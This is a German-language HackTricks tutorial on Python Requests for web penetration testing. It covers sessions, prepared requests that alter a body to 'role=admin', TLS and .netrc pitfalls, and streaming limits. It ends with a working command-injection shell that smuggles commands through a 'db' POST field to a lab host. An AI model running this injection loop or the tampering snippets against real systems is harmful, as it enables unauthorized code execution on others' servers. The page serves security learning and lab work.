# Web Requests

{{#include ../../banners/hacktricks-training.md}}

## Python Requests

Diese Beispiele verwenden die dokumentierten Request-Argumente, Response-Eigenschaften, Multipart-Dateitupel und Sessions von Requests.<sup>[[1]](#references)</sup> Die Beispiele mit `verify=False` deaktivieren die Überprüfung von TLS-Zertifikaten und sollten auf kontrollierte Tests beschränkt werden.<sup>[[1]](#references)</sup>
```python
import random
import re
import string

import requests

url = "http://example.com:80/some/path.php"
params = {"p1":"value1", "p2":"value2"}
headers = {"User-Agent": "fake User Agent", "Fake header": "True value"}
cookies = {"PHPSESSID": "1234567890abcdef", "FakeCookie123": "456"}
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

#Regular Get requests sending parameters (params)
gr = requests.get(url, params=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True)

code = gr.status_code
ret_headers = gr.headers
body_byte = gr.content
body_text = gr.text
ret_cookies = gr.cookies
is_redirect = gr.is_redirect
is_permanent_redirect = gr.is_permanent_redirect
float_seconds = gr.elapsed.total_seconds()

#Regular Post requests sending parameters (data)
pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Json Post requests sending parameters(json)
pr = requests.post(url, json=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Post request sending a file(files) and extra values
filedict = {"<FILE_PARAMETER_NAME>" : ("filename.png", open("filename.png", 'rb').read(), "image/png")}
pr = requests.post(url, data={"submit": "submit"}, files=filedict)

#Useful for presenting results in boolean/time based injections
print(f"\rflag: {flag}{char}", end="")




##### Example Functions
target = "http://10.10.10.10:8000"
proxies = {}
s = requests.Session()

def register(username, password):
resp = s.post(target + "/register", data={"username":username, "password":password, "submit": "Register"}, proxies=proxies, verify=0)
return resp

def login(username, password):
resp = s.post(target + "/login", data={"username":username, "password":password, "submit": "Login"}, proxies=proxies, verify=0)
return resp

def get_info(name):
resp = s.post(target + "/projects", data={"name":name, }, proxies=proxies, verify=0)
guid = re.match('<a href="\/info\/([^"]*)">' + name + '</a>', resp.text)[1]
return guid

def upload(guid, filename, data):
resp = s.post(target + "/upload/" + guid, data={"submit": "upload"}, files={"file":(filename, data)}, proxies=proxies, verify=0)
guid = re.match('"' + filename + '": "([^"]*)"', resp.text)[1]
return guid

def json_search(guid, search_string):
resp = s.post(target + "/api/search/" + guid + "/", json={"search":search_string}, headers={"Content-Type": "application/json"}, proxies=proxies, verify=0)
return resp.json()

def get_random_string(guid, path):
return ''.join(random.choice(string.ascii_letters) for i in range(10))
```
## Vorbereitete Requests zur Payload-Steuerung

Ein `PreparedRequest` stellt die finale URL, Header und den encodierten Body bereit, bevor er gesendet wird. Erstelle ihn mit `Session.prepare_request()` (statt `Request.prepare()`), wenn Session-Cookies oder Authentifizierung angewendet werden müssen; wenn der vorbereitete Ablauf außerdem Proxy-/CA-Einstellungen der Umgebung berücksichtigen muss, führe sie ausdrücklich mit `merge_environment_settings()` zusammen.<sup>[[1]](#references)</sup>
```python
s = requests.Session()
req = requests.Request("POST", url, data=b"role=user")
prepped = s.prepare_request(req)
prepped.body = b"role=admin%26debug%3D1"
prepped.headers["Content-Length"] = str(len(prepped.body))

env = s.merge_environment_settings(prepped.url, {}, None, None, None)
r = s.send(prepped, timeout=(3.05, 15), allow_redirects=False, **env)
print(r.request.headers)
print(r.request.body)
```
Dies ist nützlich, wenn ein Exploit eine nicht standardmäßige Kodierung benötigt oder wenn die erstellte Payload mit dem in `response.request` gespeicherten Request verglichen wird. Es handelt sich nicht um ein Raw-HTTP-Primitiv: Requests speichert Header in einem Mapping ohne Beachtung der Groß-/Kleinschreibung, sodass das Zuweisen eines doppelten Namens den vorherigen Wert ersetzt. Verwende einen Sender auf niedrigerer Ebene für fehlerhafte Request-Zeilen oder verschiedene doppelte `Content-Length`-/`Transfer-Encoding`-Felder, die für [HTTP request-smuggling tests](../../pentesting-web/http-request-smuggling/README.md) benötigt werden.<sup>[[1]](#references)</sup>

## Session-Isolierung, implizite Zugangsdaten und TLS-Zustand

Eine Session vertraut standardmäßig auf die Umgebungskonfiguration. Wenn keine explizite Authentifizierung angegeben wird, kann Requests Basic-Credentials aus `.netrc` beziehen; außerdem kann es Proxy-Konfigurationen und Pfade zu CA-Bundles aus Umgebungsvariablen importieren. Bei Scripts, die von Angreifern kontrollierte URLs abrufen, deaktiviere diese impliziten Eingaben und konfiguriere nur den vorgesehenen Lab-Proxy bzw. das vorgesehene CA-Bundle explizit. Releases vor 2.32.4 konnten bei einer bösartig erstellten URL `.netrc`-Credentials für den falschen Host auswählen, während `Session.trust_env = False` der dokumentierte Workaround ist, wenn ein Upgrade nicht möglich ist.<sup>[[1]](#references)[[4]](#references)</sup>
```python
s = requests.Session()
s.trust_env = False
s.verify = "/path/to/lab-ca.pem"  # Prefer a lab CA over verify=False
s.proxies = {
"http": "http://127.0.0.1:8080",
"https": "http://127.0.0.1:8080",
}
```
Halte eine Session, die `verify=False` verwendet, getrennt von Sessions, die verifiziertes TLS erfordern. In Requests vor Version 2.32.0 konnte eine Verbindung, die zuerst mit `verify=False` geöffnet wurde, für spätere Same-Origin-Requests wiederverwendet werden, selbst wenn diese Requests `verify=True` angaben; ein Upgrade behebt dieses Problem mit dem Pool-Zustand, aber die Isolation erleichtert auch die Prüfung von Exploit-Skripten.<sup>[[5]](#references)</sup>

## Zuverlässige Exploit-Schleifen

Requests hat standardmäßig kein Timeout. Ein `(connect, read)`-Timeout ist keine absolute Frist für die gesamte Ausführung: Die `read`-Komponente begrenzt, wie lange der Client zwischen empfangenen Bytes wartet. Deaktiviere automatische Redirects, wenn ein Target `Location` kontrolliert, und validiere jeden Hop, bevor du einen neuen Request sendest; wenn Redirects aktiviert sind, überprüfe `response.history`. Verwende für große oder bösartige Responses `stream=True`, iteriere in begrenzten Chunks und schließe die Response mit einem Context Manager, damit die gepoolte Verbindung freigegeben wird.<sup>[[1]](#references)</sup>
```python
limit = 2 * 1024 * 1024
body = bytearray()

with s.get(url, timeout=(3.05, 10), allow_redirects=False, stream=True) as r:
print(r.status_code, r.headers.get("Location"))
for chunk in r.iter_content(64 * 1024):
if len(body) + len(chunk) > limit:
raise ValueError("response exceeds limit")
body.extend(chunk)
```
## Python-Befehl zur Ausnutzung einer RCE

Die command loop leitet sich von Pythons `Cmd` ab; ihre `default`-Methode verarbeitet nicht erkannte command prefixes, `cmdloop` verteilt Eingabezeilen, und `re.DOTALL` ermöglicht es dem Extraktionsmuster, sich über Zeilenumbrüche zu erstrecken.<sup>[[2]](#references)[[3]](#references)</sup>
```python
import requests
import re
from cmd import Cmd

class Terminal(Cmd):
prompt = "Inject => "

def default(self, args):
output = RunCmd(args)
print(output)

def RunCmd(cmd):
data = { 'db': f'lol; echo -n "MYREGEXP"; {cmd}; echo -n "MYREGEXP2"' }
r = requests.post('http://10.10.10.127/select', data=data)
page = r.text
m = re.search('MYREGEXP(.*?)MYREGEXP2', page, re.DOTALL)
if m:
return m.group(1)
else:
return 1


term = Terminal()
term.cmdloop()
```
## References

- [1] [Requests-Entwicklerschnittstelle](https://requests.readthedocs.io/en/stable/api/)
- [2] [Python `cmd` — Unterstützung für zeilenorientierte Befehlsinterpreter](https://docs.python.org/3/library/cmd.html)
- [3] [Python `re` — Operationen mit regulären Ausdrücken](https://docs.python.org/3/library/re.html)
- [4] [Requests ist über bösartige URLs für einen `.netrc`-Anmeldedaten-leak anfällig](https://github.com/psf/requests/security/advisories/GHSA-9hjg-9r4m-mvj7)
- [5] [Das Requests-`Session`-Objekt überprüft Requests nicht, nachdem der erste Request mit `verify=False` durchgeführt wurde](https://github.com/psf/requests/security/advisories/GHSA-9wx4-h78v-vm56)
{{#include ../../banners/hacktricks-training.md}}
